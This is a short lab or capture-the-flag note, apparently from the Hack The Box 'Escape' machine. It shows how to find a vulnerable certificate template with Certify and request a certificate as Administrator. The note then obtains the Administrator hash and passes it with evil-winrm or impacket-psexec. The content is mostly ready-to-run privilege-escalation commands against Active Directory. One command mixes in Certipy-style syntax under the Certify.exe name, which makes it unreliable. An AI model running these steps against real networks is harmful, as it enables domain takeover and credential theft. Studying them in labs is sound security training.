
If the compromised machine is a certificate authority 
![[Pasted image 20250804212831.png]]
- An example 

Upload certify to the compromised machine

```
.\Certify.exe find /vulnerable
```
```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

Working example in Escape
also https://www.youtube.com/watch?v=splRNoUtPWg&list=PLM1644RoigJuwXZUVJ9fkFzURW_1LgU5V&index=3

```
.\Certify.exe req -u '[username@domain name]' -p '[password]' -dc-ip [target IP] -target '[CA name]' -ca '[ca name]' -template 'UserAuthentication' -upn '[administrator username]'
```
```
.\Certify.exe auth -pfx 'administrator.pfx' -dc-ip [target IP]
```

This should give us the hash for Administrator, then we use Pass-the-Hash with evil-winrm or impacket-psexec